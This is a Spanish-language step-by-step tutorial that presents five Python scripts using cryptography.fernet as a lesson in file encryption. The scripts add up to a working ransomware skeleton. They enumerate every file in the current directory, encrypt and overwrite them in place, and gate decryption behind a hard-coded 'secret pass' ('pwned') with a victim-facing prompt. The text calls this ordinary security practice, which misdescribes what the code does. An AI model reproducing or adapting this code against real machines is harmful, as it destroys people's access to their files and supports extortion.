# PoC\_tutorial: `cryptography.fernet`

Este documento es un **tutorial práctico paso a paso** sobre la librería `cryptography.fernet` de Python, mostrando cómo listar archivos, generar una clave, cifrar y descifrar ficheros, e incluso añadir un control de acceso mediante contraseña.

---

## Introducción a `cryptography.fernet`

`cryptography.fernet` permite realizar cifrado simétrico seguro con autenticación de mensajes integrada. Sus principales características:

* Generación de claves seguras (`Fernet.generate_key()`).
* Funciones de cifrado y descifrado (`encrypt()` y `decrypt()`) que manejan `bytes`.
* Protección de integridad y confidencialidad de los datos.

El tutorial muestra la evolución de scripts que usan Fernet desde operaciones básicas hasta un flujo completo de cifrado/descifrado.

---

# Evolución de Scripts

## Script 1 — `encrypt_v1.py`

**Función:** Listar archivos en el directorio actual, excluyendo el script propio.

```python
#!/usr/bin/env python3
import os
files = []
for file in os.listdir():
    if file == "encrypt_v1.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
```

**Salida:**

```
['saludo.txt', 'enfado.txt', 'pwned.txt']
```

**Qué se ha añadido:**

* Creación de la lista de archivos a procesar.
* Filtrado del propio script para no incluirlo.

**Explicación:**
Este script sirve como base para identificar qué archivos se van a procesar en etapas posteriores. Permite recorrer el directorio de trabajo y crear una lista que se usará para cifrar o descifrar.

---

## Script 2 — `encrypt_v2.py`

**Función:** Generar una clave Fernet.

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "encrypt_v1.py":
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()
print(key)
```

**Salida:** Clave Fernet en bytes.

**Qué se ha añadido:**

* Importación de `Fernet` de la librería `cryptography`.
* Generación de la clave simétrica con `Fernet.generate_key()`.
* Impresión de la clave en consola.

**Explicación:**
Ahora contamos con una clave única que permitirá cifrar y descifrar los archivos. Esta clave es esencial para mantener la confidencialidad de los datos y servirá en los scripts posteriores.

---

## Script 3 — `encrypt_v3.py`

**Función:** Guardar la clave en un fichero.

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "encrypt_v1.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
key = Fernet.generate_key()
with open("thekey.key", "wb") as k:
    k.write(key)
```

**Qué se ha añadido:**

* Guardado de la clave generada en un fichero `thekey.key` en modo binario (`wb`).

**Explicación:**
Almacenamos la clave en un archivo para poder reutilizarla más tarde y descifrar los archivos cifrados sin necesidad de generar una nueva clave cada vez.

---

## Script 4 — `encrypt_v4.py` + `decrypt.py`

**Función:** Cifrar y descifrar archivos usando la clave Fernet.

**Cifrado (`encrypt_v4.py`):**

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file in ["encrypt_v4.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()
with open("thekey.key", "wb") as k:
    k.write(key)
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_encrypted)
```

**Descifrado (`decrypt.py`):**

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file in ["encrypt_v4.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
with open("thekey.key", "rb") as k:
    secretkey = k.read()
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_decrypted)
```

**Qué se ha añadido:**

* Cifrado de cada archivo usando `Fernet(key).encrypt(contents)`.
* Descifrado de cada archivo usando `Fernet(secretkey).decrypt(contents)`.
* Excepción de los archivos de scripts y de la clave para evitar cifrarlos accidentalmente.

**Explicación:**
Se logra un flujo completo de cifrado y descifrado de archivos, usando la misma clave Fernet para garantizar que los datos puedan ser recuperados íntegros y en texto claro.

---

## Script 5 — `encrypt_v5.py` + `decrypt.py` con contraseña

**Función:** Añadir control de acceso mediante contraseña al descifrado.

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file in ["encrypt_v5.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
with open("thekey.key", "rb") as k:
    secretkey = k.read()
secretPass = "pwned"
user_Pass = input("\n[+] Introduce el pase secreto para desencriptar tus archivos: ")
if user_Pass == secretPass:
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as f:
            f.write(contents_decrypted)
    print("\n[!] Enhorabuena tus archivos fueron descifrados\n")
else:
    print("\n[!!!] Ese no es el pase secreto, lo siento.")
```

**Qué se ha añadido:**

* Solicitud de contraseña al usuario antes del descifrado.
* Validación de la contraseña con un valor predefinido (`secretPass`).
* Descifrado solo si la contraseña es correcta.
* Mensajes de éxito o error según el caso.

**Explicación:**
Este script incrementa la seguridad añadiendo un control de acceso. Aunque los archivos estén cifrados, solo un usuario con la contraseña correcta puede recuperar su contenido.

---

**Resumen:**

1. Listado de archivos para procesar.
2. Generación y almacenamiento de clave Fernet.
3. Cifrado de archivos y sobrescritura.
4. Descifrado seguro de archivos.
5. Control de acceso mediante contraseña.

El flujo puede extenderse con exclusión dinámica de archivos, manejo de errores, logging y otras buenas prácticas de seguridad.

---
